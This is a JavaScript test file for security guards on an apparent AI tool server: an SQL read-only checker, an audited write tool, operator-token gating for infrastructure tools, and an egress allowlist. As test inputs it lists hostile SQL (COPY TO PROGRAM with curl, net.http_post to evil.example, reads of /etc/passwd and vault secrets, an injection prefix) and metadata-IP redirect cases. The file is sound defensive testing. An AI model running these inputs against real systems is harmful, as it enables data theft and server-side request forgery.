/**
 * test-least-privilege-tools.js — 2026-10-07 IT/GoCloud review follow-up
 * (AI OS CANON.SEC.007 / SEC.003 / SEC.002 / SEC.011).
 *
 *   A. SQL tool split: sql-guard tokenizer, supabase_run_query modes
 *      (readwrite default = unchanged, shadow, readonly), supabase_write_query
 *      (reason + confirm + audit, registered only behind its flag), hl_query,
 *      supabase_list_tables prefix validation.
 *   B. Infra tools behind the operator token (INFRA_TOOLS_MODE).
 *   C. http_request egress (HTTP_EGRESS_MODE / HTTP_EGRESS_ALLOWLIST).
 *   D. tool_audit_log writer is fire-and-forget and never throws.
 */

import test from 'node:test';
import assert from 'node:assert/strict';

delete process.env.SUPABASE_URL;
delete process.env.SUPABASE_SERVICE_ROLE_KEY;

const { tokenizeSql, analyzeSql, decideReadQuery, sqlToolMode, sqlWriteToolEnabled } = await import('../src/security/sql-guard.js');
const { recordToolAudit, sqlFingerprint, actorFromExtra, __setToolAuditClientForTests, toolAuditMode } = await import('../src/security/tool-audit.js');
const { makeRunQueryHandler, makeWriteQueryHandler, registerSupabaseAdminTools, readonlyRpcName } = await import('../src/tools/admin/supabase-tools.js');
const { makeHlQueryHandler } = await import('../src/tools/admin/hl-fallback.js');
const infra = await import('../src/security/infra-guard.js');
const egress = await import('../src/security/egress-guard.js');
const { registerHttpTools } = await import('../src/tools/admin/http-tools.js');

const parse = (r) => JSON.parse(r.content[0].text);
const OPERATOR = { authInfo: { clientId: 'operator', scopes: ['operator'] }, sessionId: 's-op' };
const ANON = { authInfo: { clientId: 'mcp-client', scopes: [] }, sessionId: 's-anon' };

function fakeServer() {
  const tools = new Map();
  return {
    tools,
    tool(name, desc, schema, handler) { tools.set(name, { desc, schema, handler }); },
  };
}
function auditSpy() {
  const rows = [];
  const fn = (row) => { rows.push(row); return row; };
  fn.rows = rows;
  return fn;
}

// ─── A. sql-guard ────────────────────────────────────────────────────────────

test('tokenizer skips strings, quoted identifiers, comments and dollar quotes as units', () => {
  const t = tokenizeSql(`SELECT 'it''s DELETE', E'a\\'b UPDATE', "update", $$DROP$$, $x$INSERT$x$ -- DELETE\n /* a /* nested */ TRUNCATE */ FROM t`);
  assert.equal(t.ok, true);
  const words = t.tokens.filter((x) => x.type === 'word').map((x) => x.value.toUpperCase());
  assert.deepEqual(words, ['SELECT', 'FROM', 'T']);
  assert.equal(t.tokens.find((x) => x.type === 'ident').value, 'update');
});

test('unterminated strings, identifiers, comments and dollar quotes fail closed', () => {
  for (const sql of ["SELECT 'oops", 'SELECT "x', 'SELECT 1 /* never', 'SELECT $$ body', "SELECT E'\\'"]) {
    const a = analyzeSql(sql);
    assert.equal(a.readOnly, false, sql);
    assert.match(a.reason, /^unterminated_/, sql);
  }
});

test('single reads pass: SELECT, WITH…SELECT, EXPLAIN, parenthesised, trailing semicolon, keywords in data', () => {
  const ok = [
    'SELECT count(*) FROM lp_leads',
    'select * from lp_leads where notes ilike \'%update%\' or notes ilike \'%delete from%\';',
    'WITH s AS (SELECT id FROM lp_jobs) SELECT json_agg(row_to_json(s)) FROM s',
    'EXPLAIN SELECT 1',
    'EXPLAIN ANALYZE SELECT * FROM lp_leads LIMIT 1',
    '(SELECT 1) UNION ALL (SELECT 2)',
    'SELECT "update", "delete" FROM t',
    'SELECT pg_size_pretty(pg_total_relation_size(\'lp_leads\'))',
    'SELECT * FROM pg_stat_activity',
    'SELECT update_count, inserted_at FROM t -- DELETE later\n',
    'SELECT $1::int',
    'VALUES (1), (2)',
    'SELECT now() AT TIME ZONE \'America/New_York\'',
  ];
  for (const sql of ok) assert.equal(analyzeSql(sql).readOnly, true, `${sql} → ${analyzeSql(sql).reason}`);
});

test('writes, chains, SELECT INTO, row locks, admin functions and secrets are refused', () => {
  const bad = {
    'INSERT INTO t VALUES (1)': 'not_a_read:INSERT',
    'UPDATE lp_leads SET x = 1': 'not_a_read:UPDATE',
    'DELETE FROM lp_leads': 'not_a_read:DELETE',
    'CREATE TABLE x (id int)': 'not_a_read:CREATE',
    'ALTER TABLE t ADD COLUMN c int': 'not_a_read:ALTER',
    'DROP TABLE t': 'not_a_read:DROP',
    'TRUNCATE t': 'not_a_read:TRUNCATE',
    'COPY t TO PROGRAM \'curl x\'': 'not_a_read:COPY',
    'SET ROLE postgres': 'not_a_read:SET',
    'DO $$ BEGIN DELETE FROM t; END $$': 'not_a_read:DO',
    'CALL p()': 'not_a_read:CALL',
    'SELECT 1; DELETE FROM t': 'multiple_statements',
    'SELECT 1;; SELECT 2': 'multiple_statements',
    'WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d': 'write_keyword:DELETE',
    'EXPLAIN ANALYZE DELETE FROM t': 'write_keyword:DELETE',
    'SELECT * INTO new_t FROM t': 'write_keyword:INTO',
    'SELECT * FROM t FOR UPDATE': 'write_keyword:UPDATE',
    'SELECT * FROM t FOR SHARE': 'row_lock:FOR_SHARE',
    'SELECT pg_terminate_backend(123)': 'blocked_function:pg_terminate_backend',
    'SELECT pg_reload_conf()': 'blocked_function:pg_reload_conf',
    'SELECT pg_read_file(\'/etc/passwd\')': 'blocked_function:pg_read_file',
    "SELECT set_config('role', 'postgres', false)": 'blocked_function:set_config',
    "SELECT run_sql('DELETE FROM lp_leads')": 'blocked_function:run_sql',
    "SELECT nextval('s')": 'blocked_function:nextval',
    "SELECT * FROM dblink('host=x', 'delete from t') AS r(a int)": 'blocked_function:dblink',
    'SELECT lo_import(\'/etc/passwd\')': 'blocked_function:lo_import',
    "SELECT net.http_post('https://evil.example', '{}')": 'blocked_schema:net',
    "SELECT query_to_xml('delete from t', true, true, '')": 'blocked_function:query_to_xml',
    'SELECT * FROM vault.decrypted_secrets': 'blocked_schema:vault',
    'SELECT * FROM "vault".secrets': 'blocked_schema:vault',
    'SELECT pg_sleep(600)': 'blocked_function:pg_sleep',
    '': 'empty',
    ' ; ': 'empty',
  };
  for (const [sql, reason] of Object.entries(bad)) {
    const a = analyzeSql(sql);
    assert.equal(a.readOnly, false, sql);
    assert.equal(a.reason, reason, sql);
  }
});

test('destructive is read from code anywhere, not just the first word', () => {
  assert.equal(analyzeSql('ALTER TABLE t DROP COLUMN c').destructive, true);
  assert.equal(analyzeSql('TRUNCATE t').destructive, true);
  assert.equal(analyzeSql("UPDATE t SET note = 'drop it'").destructive, false);
});

test('modes: unset/unknown is readwrite; write tool is off unless exactly true', () => {
  assert.equal(sqlToolMode({}), 'readwrite');
  assert.equal(sqlToolMode({ SQL_TOOL_MODE: 'read-only' }), 'readwrite');
  assert.equal(sqlToolMode({ SQL_TOOL_MODE: ' Shadow ' }), 'shadow');
  assert.equal(sqlToolMode({ SQL_TOOL_MODE: 'READONLY' }), 'readonly');
  assert.equal(sqlWriteToolEnabled({}), false);
  assert.equal(sqlWriteToolEnabled({ SQL_WRITE_TOOL_ENABLED: 'TRUE' }), true);
  assert.equal(readonlyRpcName({}), 'run_sql');
  assert.equal(readonlyRpcName({ SQL_READONLY_RPC: 'run_sql_readonly' }), 'run_sql_readonly');
  assert.equal(readonlyRpcName({ SQL_READONLY_RPC: 'anything_else' }), 'run_sql');
  assert.deepEqual(
    ['readwrite', 'shadow', 'readonly'].map((m) => decideReadQuery('DELETE FROM t', m).decision),
    ['allow', 'would_deny', 'deny'],
  );
});

// ─── A. supabase_run_query ───────────────────────────────────────────────────

test('readwrite (default): a write runs exactly as before, with no audit row', async () => {
  const ran = [];
  const audit = auditSpy();
  const h = makeRunQueryHandler({ run: async (q, c) => { ran.push([q, c]); return { status: 'ok' }; }, audit, env: {}, log: () => {} });
  const r = parse(await h({ query: 'UPDATE t SET x = 1' }, ANON));
  assert.equal(r.success, true);
  assert.deepEqual(ran, [['UPDATE t SET x = 1', false]]);
  assert.equal(audit.rows.length, 0);
  // confirm_destructive still passes through untouched
  await h({ query: 'DROP TABLE t', confirm_destructive: true }, ANON);
  assert.deepEqual(ran[1], ['DROP TABLE t', true]);
});

test('shadow: the write still runs, logs would_block and audits would_deny with sha + head', async () => {
  const ran = [];
  const logs = [];
  const audit = auditSpy();
  const h = makeRunQueryHandler({ run: async (q) => { ran.push(q); return []; }, audit, env: { SQL_TOOL_MODE: 'shadow' }, log: (m) => logs.push(m) });
  await h({ query: 'DELETE FROM lp_leads WHERE id = 1' }, ANON);
  assert.equal(ran.length, 1);
  assert.equal(audit.rows.length, 1);
  const row = audit.rows[0];
  assert.equal(row.tool, 'supabase_run_query');
  assert.equal(row.decision, 'would_deny');
  assert.equal(row.mode, 'shadow');
  assert.equal(row.actor, 'mcp-client');
  assert.equal(row.detail.sql_head, 'DELETE FROM lp_leads WHERE id = 1');
  assert.match(row.detail.sql_sha256, /^[0-9a-f]{64}$/);
  assert.match(logs[0], /\[SQLGuard\] would_block/);
  // A read in shadow is neither logged nor audited.
  await h({ query: 'SELECT 1' }, ANON);
  assert.equal(audit.rows.length, 1);
});

test('readonly: writes are refused with a pointer to the write tool; reads use the read-only RPC', async () => {
  const ran = [];
  const ro = [];
  const audit = auditSpy();
  const env = { SQL_TOOL_MODE: 'readonly' };
  const h = makeRunQueryHandler({ run: async (q) => { ran.push(q); }, runReadonly: async (q) => { ro.push(q); return [{ ok: 1 }]; }, audit, env, log: () => {} });
  const r = parse(await h({ query: 'WITH d AS (DELETE FROM t RETURNING 1) SELECT count(*) FROM d' }, ANON));
  assert.equal(r.error, 'read_only_tool');
  assert.match(r.detail, /not enabled on this server/);
  assert.equal(ran.length + ro.length, 0, 'nothing executed');
  assert.equal(audit.rows[0].decision, 'deny');
  assert.equal(audit.rows[0].reason, 'write_keyword:DELETE');

  const h2 = makeRunQueryHandler({ run: async () => {}, runReadonly: async () => [], audit, env: { ...env, SQL_WRITE_TOOL_ENABLED: 'true' }, log: () => {} });
  assert.match(parse(await h2({ query: 'INSERT INTO t VALUES (1)' }, ANON)).detail, /Use supabase_write_query/);

  const ok = parse(await h({ query: 'SELECT 1 AS ok' }, ANON));
  assert.deepEqual(ok.result, [{ ok: 1 }]);
  assert.deepEqual(ro, ['SELECT 1 AS ok']);
  assert.equal(ran.length, 0, 'readonly never touches the read/write path');
});

// ─── A. supabase_write_query ─────────────────────────────────────────────────

test('write tool: every call is audited before anything runs; reason and confirm are required', async () => {
  const order = [];
  const audit = (row) => { order.push(`audit:${row.decision}:${row.reason}`); return row; };
  const h = makeWriteQueryHandler({ run: async () => { order.push('run'); return { status: 'ok' }; }, audit, env: {}, log: () => {} });

  assert.equal(parse(await h({ query: 'UPDATE t SET x=1', reason: 'fix' }, OPERATOR)).error, 'reason_required');
  const p = parse(await h({ query: 'UPDATE t SET x=1', reason: 'backfill x for lead 1' }, OPERATOR));
  assert.equal(p.preview, true);
  assert.equal(p.first_keyword, 'UPDATE');
  const d = parse(await h({ query: 'ALTER TABLE t DROP COLUMN c', reason: 'remove the dead column', confirm: true }, OPERATOR));
  assert.equal(d.error, 'confirm_destructive_required');
  const ok = parse(await h({ query: 'UPDATE t SET x=1', reason: 'backfill x for lead 1', confirm: true }, OPERATOR));
  assert.equal(ok.success, true);
  assert.match(ok.sql_sha256, /^[0-9a-f]{64}$/);

  assert.deepEqual(order, [
    'audit:deny:reason_missing',
    'audit:deny:preview_confirm_missing',
    'audit:deny:destructive_confirm_missing',
    'audit:allow:backfill x for lead 1',
    'run',
  ]);
});

test('write tool audit row: who, reason, sha, first 500 chars only', async () => {
  const audit = auditSpy();
  const long = `UPDATE t SET note = '${'x'.repeat(800)}'`;
  const h = makeWriteQueryHandler({ run: async () => ({}), audit, env: {}, log: () => {} });
  await h({ query: long, reason: 'long note repair', confirm: true }, OPERATOR);
  const row = audit.rows[0];
  assert.equal(row.tool, 'supabase_write_query');
  assert.equal(row.actor, 'operator');
  assert.equal(row.detail.session_id, 's-op');
  assert.equal(row.detail.given_reason, 'long note repair');
  assert.equal(row.detail.sql_head.length, 500);
  assert.equal(row.detail.sql_length, long.length);
  assert.equal(row.detail.sql_sha256, sqlFingerprint(long).sql_sha256);
});

test('registration: supabase_write_query exists only with SQL_WRITE_TOOL_ENABLED=true; description follows the mode', () => {
  const s1 = fakeServer();
  registerSupabaseAdminTools(s1, { env: {} });
  assert.equal(s1.tools.has('supabase_write_query'), false);
  assert.match(s1.tools.get('supabase_run_query').desc, /INSERT, UPDATE, DELETE/);

  const s2 = fakeServer();
  registerSupabaseAdminTools(s2, { env: { SQL_TOOL_MODE: 'readonly', SQL_WRITE_TOOL_ENABLED: 'true' } });
  assert.equal(s2.tools.has('supabase_write_query'), true);
  assert.match(s2.tools.get('supabase_run_query').desc, /read-only/);
  assert.ok(s2.tools.get('supabase_write_query').schema.reason, 'reason is a declared argument');
});

test('supabase_list_tables refuses a prefix that is not a table-name fragment', async () => {
  const s = fakeServer();
  registerSupabaseAdminTools(s, { env: {} });
  const r = await s.tools.get('supabase_list_tables').handler({ prefix: "x' UNION SELECT run_sql('delete from t') --" });
  assert.match(r.content[0].text, /only letters, digits and underscores/);
});

test('hl_query: the old keyword guard still runs first; readonly adds the tokenizer guard', async () => {
  const ran = [];
  const audit = auditSpy();
  const run = async (q) => { ran.push(q); return []; };
  const rw = makeHlQueryHandler({ run, audit, env: {}, log: () => {} });
  await assert.rejects(() => rw({ query: 'DELETE FROM contacts' }, ANON), /only SELECT/);
  await rw({ query: "SELECT set_config('x','y',false)" }, ANON);
  assert.equal(ran.length, 1, 'readwrite keeps today\'s hl_query behaviour');

  const ro = makeHlQueryHandler({ run, audit, env: { SQL_TOOL_MODE: 'readonly' }, log: () => {} });
  const r = JSON.parse((await ro({ query: "SELECT set_config('x','y',false)" }, ANON)).content[0].text);
  assert.equal(r.error, 'read_only_tool');
  assert.equal(ran.length, 1);
  assert.equal(audit.rows.at(-1).tool, 'hl_query');
  await ro({ query: 'SELECT id FROM workflows LIMIT 1' }, ANON);
  assert.equal(ran.length, 2);
});

// ─── B. infra tools ──────────────────────────────────────────────────────────

test('operator token: INFRA_OPERATOR_TOKEN wins when set, else MCP_AUTH_TOKEN as Bearer', () => {
  const req = (h) => ({ headers: h });
  assert.equal(infra.isOperatorRequest(req({ authorization: 'Bearer mcp' }), { MCP_AUTH_TOKEN: 'mcp' }), true);
  assert.equal(infra.isOperatorRequest(req({ authorization: 'Bearer nope' }), { MCP_AUTH_TOKEN: 'mcp' }), false);
  assert.equal(infra.isOperatorRequest(req({}), { MCP_AUTH_TOKEN: 'mcp' }), false);
  assert.equal(infra.isOperatorRequest(req({ authorization: 'Bearer mcp' }), {}), false, 'nothing configured → nobody is operator');
  const env = { MCP_AUTH_TOKEN: 'mcp', INFRA_OPERATOR_TOKEN: 'op' };
  assert.equal(infra.isOperatorRequest(req({ authorization: 'Bearer mcp' }), env), false, 'the MCP token no longer counts once a dedicated one is set');
  assert.equal(infra.isOperatorRequest(req({ authorization: 'Bearer op' }), env), true);
  assert.equal(infra.isOperatorRequest(req({ authorization: 'Bearer mcp', 'x-operator-token': 'op' }), env), true);
});

test('attachOperatorAuth stamps req.auth without the raw token', () => {
  const prev = { m: process.env.MCP_AUTH_TOKEN, i: process.env.INFRA_OPERATOR_TOKEN };
  process.env.MCP_AUTH_TOKEN = 'secret-mcp';
  delete process.env.INFRA_OPERATOR_TOKEN;
  try {
    const r = { headers: { authorization: 'Bearer secret-mcp' } };
    let nexted = false;
    infra.attachOperatorAuth(r, {}, () => { nexted = true; });
    assert.equal(nexted, true);
    assert.deepEqual(r.auth.scopes, ['operator']);
    assert.ok(!JSON.stringify(r.auth).includes('secret-mcp'));
    const r2 = { headers: {} };
    infra.attachOperatorAuth(r2, {}, () => {});
    assert.deepEqual(r2.auth.scopes, []);
  } finally {
    if (prev.m === undefined) delete process.env.MCP_AUTH_TOKEN; else process.env.MCP_AUTH_TOKEN = prev.m;
    if (prev.i !== undefined) process.env.INFRA_OPERATOR_TOKEN = prev.i;
  }
});

function guardedServer(env) {
  const inner = fakeServer();
  const audit = auditSpy();
  const logs = [];
  const server = infra.withInfraGuard(inner, { env, audit, log: (m) => logs.push(m) });
  const calls = [];
  server.tool('set_railway_env_var', 'd', {}, async (args) => { calls.push(args); return { content: [{ type: 'text', text: 'set' }] }; });
  server.tool('get_railway_logs', 'd', {}, async () => ({ content: [{ type: 'text', text: 'logs' }] }));
  return { inner, audit, logs, calls };
}

test('INFRA_TOOLS_MODE=open (default): every client may call, every call is audited, the value never is', async () => {
  const { inner, audit, calls } = guardedServer({});
  const r = await inner.tools.get('set_railway_env_var').handler({ name: 'GHL_API_KEY', value: 'pit-SECRET', confirm: true }, ANON);
  assert.equal(r.content[0].text, 'set');
  assert.equal(calls.length, 1);
  assert.equal(audit.rows[0].decision, 'allow');
  assert.equal(audit.rows[0].reason, 'open_mode');
  assert.equal(audit.rows[0].detail.args.name, 'GHL_API_KEY');
  assert.ok(!JSON.stringify(audit.rows).includes('pit-SECRET'), 'env var value is never audited');
});

test('INFRA_TOOLS_MODE=shadow: allowed, but a call without the token is would_deny', async () => {
  const { inner, audit, logs, calls } = guardedServer({ INFRA_TOOLS_MODE: 'shadow' });
  await inner.tools.get('set_railway_env_var').handler({ name: 'X', value: 'y' }, ANON);
  assert.equal(calls.length, 1);
  assert.equal(audit.rows[0].decision, 'would_deny');
  assert.match(logs[0], /\[InfraGuard\] would_deny set_railway_env_var/);
  await inner.tools.get('set_railway_env_var').handler({ name: 'X', value: 'y' }, OPERATOR);
  assert.equal(audit.rows[1].decision, 'allow');
});

test('INFRA_TOOLS_MODE=operator: refused without the token, runs with it; other tools untouched', async () => {
  const { inner, audit, calls } = guardedServer({ INFRA_TOOLS_MODE: 'operator' });
  const denied = await inner.tools.get('set_railway_env_var').handler({ name: 'X', value: 'y', confirm: true }, ANON);
  assert.equal(denied.isError, true);
  assert.equal(parse(denied).error, 'operator_token_required');
  assert.equal(calls.length, 0);
  assert.equal(audit.rows[0].decision, 'deny');
  // No extra at all (e.g. a transport without req.auth) is not the operator.
  await inner.tools.get('set_railway_env_var').handler({ name: 'X', value: 'y' }, undefined);
  assert.equal(calls.length, 0);
  await inner.tools.get('set_railway_env_var').handler({ name: 'X', value: 'y', confirm: true }, OPERATOR);
  assert.equal(calls.length, 1);
  const logs = await inner.tools.get('get_railway_logs').handler({}, ANON);
  assert.equal(logs.content[0].text, 'logs');
  assert.equal(audit.rows.length, 3, 'non-infra tools are not audited');
});

test('the guard covers exactly the four infra tools', () => {
  assert.deepEqual([...infra.INFRA_TOOLS].sort(), ['http_request', 'redeploy_railway_service', 'rollback_railway_deployment', 'set_railway_env_var']);
  assert.equal(infra.infraToolsMode({}), 'open');
  assert.equal(infra.infraToolsMode({ INFRA_TOOLS_MODE: 'deny-all' }), 'open');
});

// ─── C. egress ───────────────────────────────────────────────────────────────

test('allowlist: exact host, or .suffix for the domain and its subdomains', () => {
  const list = egress.parseEgressAllowlist(' .gohighlevel.com, api.five9.com ,');
  assert.deepEqual(list, ['.gohighlevel.com', 'api.five9.com']);
  assert.equal(egress.hostAllowed('services.gohighlevel.com', list), true);
  assert.equal(egress.hostAllowed('gohighlevel.com', list), true);
  assert.equal(egress.hostAllowed('evilgohighlevel.com', list), false);
  assert.equal(egress.hostAllowed('api.five9.com', list), true);
  assert.equal(egress.hostAllowed('x.api.five9.com', list), false);
  assert.equal(egress.hostAllowed('anything.com', []), false);
});

test('private, link-local, metadata, loopback and ULA addresses are blocked in every form', () => {
  for (const ip of ['169.254.169.254', '10.1.2.3', '172.16.0.1', '172.31.255.255', '192.168.1.1', '127.0.0.1',
    '0.0.0.0', '100.64.0.1', '::1', '::', 'fc00::1', 'fd12:3456::1', 'fe80::1', '::ffff:169.254.169.254',
    '::ffff:a9fe:a9fe', '[::1]']) {
    assert.equal(egress.isBlockedIp(ip), true, ip);
  }
  for (const ip of ['8.8.8.8', '172.32.0.1', '93.184.216.34', '2606:4700::1111', 'example.com']) {
    assert.equal(egress.isBlockedIp(ip), false, ip);
  }
});

test('checkEgress resolves DNS: a public name pointing at the metadata IP is refused', async () => {
  const env = { HTTP_EGRESS_ALLOWLIST: '.example.com' };
  const lookup = async () => [{ address: '169.254.169.254', family: 4 }];
  const r = await egress.checkEgress(new URL('https://rebind.example.com/x'), { env, lookup });
  assert.equal(r.ok, false);
  assert.deepEqual(r.reasons, ['resolves_to_private_ip']);

  const ok = await egress.checkEgress(new URL('https://api.example.com/'), { env, lookup: async () => [{ address: '93.184.216.34', family: 4 }] });
  assert.equal(ok.ok, true);

  const empty = await egress.checkEgress(new URL('https://api.example.com/'), { env: {}, lookup: async () => [{ address: '93.184.216.34', family: 4 }] });
  assert.deepEqual(empty.reasons, ['allowlist_empty'], 'default-deny: no allowlist, no egress');

  const lit = await egress.checkEgress(new URL('http://169.254.169.254/latest/meta-data'), { env: { HTTP_EGRESS_ALLOWLIST: '169.254.169.254' } });
  assert.ok(lit.reasons.includes('private_ip_literal'), 'allowlisting a private IP does not unblock it');

  const dnsFail = await egress.checkEgress(new URL('https://api.example.com/'), { env, lookup: async () => { const e = new Error('x'); e.code = 'ENOTFOUND'; throw e; } });
  assert.deepEqual(dnsFail.reasons, ['dns_error:ENOTFOUND']);
});

test('enforce redirects: every hop is re-checked; a hop to metadata is refused; cross-host drops credentials', async () => {
  const seen = [];
  const responses = {
    'https://a.example.com/start': { status: 302, location: 'https://b.example.com/next' },
    'https://b.example.com/next': { status: 303, location: 'http://169.254.169.254/latest' },
  };
  const fetchImpl = async (u, init) => {
    seen.push({ url: u.toString(), method: init.method, headers: { ...(init.headers || {}) }, redirect: init.redirect });
    const r = responses[u.toString()];
    return { status: r.status, headers: { get: (k) => (k === 'location' ? r.location : null) } };
  };
  const check = async (u) => (egress.isBlockedIp(u.hostname) ? { ok: false, reasons: ['private_ip_literal'] } : { ok: true, reasons: [] });
  const r = await egress.fetchWithEgressChecks('https://a.example.com/start', { method: 'POST', headers: { Authorization: 'Bearer pit', 'X-Api-Key': 'k', Accept: 'a' }, body: '{}' },
    { fetchImpl, check, credentialHeaders: ['X-Api-Key'] });
  assert.ok(r.denied);
  assert.equal(r.denied.url, 'http://169.254.169.254/latest');
  assert.equal(seen.length, 2, 'the metadata hop is never fetched');
  assert.equal(seen[0].redirect, 'manual');
  assert.equal(seen[1].method, 'GET', '302 after POST becomes GET');
  assert.deepEqual(seen[1].headers, { Accept: 'a' }, 'credentials dropped on the cross-host hop');
});

test('http_request: enforce refuses a host off the allowlist before any fetch; shadow fetches and audits', async () => {
  const fetched = [];
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (u) => { fetched.push(String(u)); return new Response('{"ok":true}', { status: 200, headers: { 'content-type': 'application/json' } }); };
  const inserts = [];
  __setToolAuditClientForTests({ from: () => ({ insert: async (row) => { inserts.push(row); return {}; } }) });
  const keep = { m: process.env.HTTP_EGRESS_MODE, a: process.env.HTTP_EGRESS_ALLOWLIST };
  try {
    const s = fakeServer();
    registerHttpTools(s);
    const h = s.tools.get('http_request').handler;

    process.env.HTTP_EGRESS_MODE = 'enforce';
    delete process.env.HTTP_EGRESS_ALLOWLIST;
    const r = parse(await h({ url: 'https://93.184.216.34/x' }, ANON));
    assert.match(r.error, /Egress blocked for 93\.184\.216\.34: allowlist_empty/);
    assert.equal(fetched.length, 0);

    process.env.HTTP_EGRESS_ALLOWLIST = '93.184.216.34';
    const ok = parse(await h({ url: 'https://93.184.216.34/x' }, ANON));
    assert.equal(ok.status, 200);
    assert.equal(fetched.length, 1);

    delete process.env.HTTP_EGRESS_MODE; // default shadow
    delete process.env.HTTP_EGRESS_ALLOWLIST;
    const sh = parse(await h({ url: 'https://93.184.216.34/y' }, ANON));
    assert.equal(sh.status, 200, 'shadow changes nothing for the caller');
    assert.equal(fetched.length, 2);
    await new Promise((res) => setImmediate(res));
    assert.ok(inserts.some((row) => row.tool === 'http_request' && row.decision === 'would_deny' && row.mode === 'egress:shadow'));
  } finally {
    globalThis.fetch = realFetch;
    __setToolAuditClientForTests(undefined);
    if (keep.m === undefined) delete process.env.HTTP_EGRESS_MODE; else process.env.HTTP_EGRESS_MODE = keep.m;
    if (keep.a === undefined) delete process.env.HTTP_EGRESS_ALLOWLIST; else process.env.HTTP_EGRESS_ALLOWLIST = keep.a;
  }
});

test('egress mode: default shadow; off and enforce only when spelled', () => {
  assert.equal(egress.httpEgressMode({}), 'shadow');
  assert.equal(egress.httpEgressMode({ HTTP_EGRESS_MODE: 'ENFORCE' }), 'enforce');
  assert.equal(egress.httpEgressMode({ HTTP_EGRESS_MODE: 'off' }), 'off');
  assert.equal(egress.httpEgressMode({ HTTP_EGRESS_MODE: 'strict' }), 'shadow');
});

// ─── D. audit writer ─────────────────────────────────────────────────────────

test('recordToolAudit is fire-and-forget: a throwing or erroring client never throws', async () => {
  const warn = console.warn;
  console.warn = () => {};
  try {
    __setToolAuditClientForTests({ from: () => { throw new Error('boom'); } });
    assert.doesNotThrow(() => recordToolAudit({ tool: 't', decision: 'allow' }));
    __setToolAuditClientForTests({ from: () => ({ insert: async () => ({ error: { message: 'relation "tool_audit_log" does not exist' } }) }) });
    assert.ok(recordToolAudit({ tool: 't', decision: 'deny' }));
    __setToolAuditClientForTests({ from: () => ({ insert: () => Promise.reject(new Error('net down')) }) });
    recordToolAudit({ tool: 't', decision: 'would_deny' });
    await new Promise((res) => setImmediate(res));
    __setToolAuditClientForTests(null);
    assert.equal(recordToolAudit({ tool: 't', decision: 'allow' }), null, 'no client (Supabase unset): nothing sent, no throw');
    assert.equal(recordToolAudit({ tool: 't', decision: 'allow' }, { TOOL_AUDIT_LOG_MODE: 'off' }), null);
    assert.equal(toolAuditMode({}), 'live');
    // An unknown decision is recorded as deny (the CHECK constraint would refuse it).
    __setToolAuditClientForTests({ from: () => ({ insert: async () => ({}) }) });
    assert.equal(recordToolAudit({ tool: 't', decision: 'maybe' }).decision, 'deny');
  } finally {
    console.warn = warn;
    __setToolAuditClientForTests(undefined);
  }
});

test('actorFromExtra reads the SDK authInfo; nothing → mcp-client, never operator', () => {
  assert.deepEqual(actorFromExtra(OPERATOR), { actor: 'operator', operator: true, session_id: 's-op' });
  assert.deepEqual(actorFromExtra(undefined), { actor: 'mcp-client', operator: false, session_id: null });
});
